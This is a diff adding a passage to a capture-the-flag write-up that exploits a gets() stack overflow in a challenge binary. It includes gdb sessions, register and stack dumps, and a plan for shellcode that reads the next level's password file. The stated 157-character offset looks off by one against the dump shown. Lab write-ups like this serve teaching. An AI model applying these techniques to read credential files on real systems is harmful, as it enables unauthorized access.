@@ -85,4 +85,69 @@ So, what do we traditionally do when we get a shellcode? We `cat /homes/levelxx/
 What does cat do? It `open()`, `read()` and `write()`. No `execve()`.
 So, we want to craft a payload that opens `/homes/level05/.pass`, reads its content and writes it to us on the standard output.
 
+First, we want to make the program segfault. More precisely, it's the child that's going to segfault, not the entire program, since its the one making the `gets()` call.
+To do that, we are going to make use of GDB, and tell it to track the child and not the parent process.
+```
+level04@OverRide:~$ gdb level04
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+(gdb) set follow-fork-mode child
+(gdb) b main
+Breakpoint 1 at 0x80486cd
+(gdb) b gets
+Breakpoint 2 at 0x80484b0
+(gdb) b *0x08048763
+Breakpoint 3 at 0x8048763
+```
+We break at main, the `gets()` call and the address just after the `gets()` call (see `desass main`)
+We ran the program, and fill `gets()` with:
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
 
+Breakpoint 3, 0x08048763 in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x49494949 in ?? ()
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fd08c4	-134412092
+edx            0xffffd680	-10624
+ebx            0x46464646	1179010630
+esp            0xffffd720	0xffffd720
+ebp            0x48484848	0x48484848
+esi            0x0	0
+edi            0x47474747	1195853639
+eip            0x49494949	0x49494949
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+```
+As we can see, the program segfault'ed as it tried to go to address `0x49494949`. `49` is `I` in ASCII.
+Thus, we need to write 157 characters and then write the address of our shellcode.
+
+Second, we can get the address of the buffer by showing the content of the stack on the third breakpoint:
+```
+(gdb) x/80x $esp
+0xffffd660:	0xffffd680	0x00000000	0x00000000	0x00000000
+0xffffd670:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
+0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd700:	0x42424242	0x43434343	0x44444444	0x45454545
+0xffffd710:	0x46464646	0x47474747	0x48484848	0x49494949
+0xffffd720:	0x4a4a4a4a	0xffffd700	0xffffd7bc	0xf7fd3000
+```
+`0xffffd680` is the address at which we start to write the data given by `gets()`.
+
+Third, let's craft the payload, in ASM, then compile it and make a Python function to print it.
+For the ASM shellcode, see `Resources/shellcode.s`, for the Python function, see `Resources/script.py`.
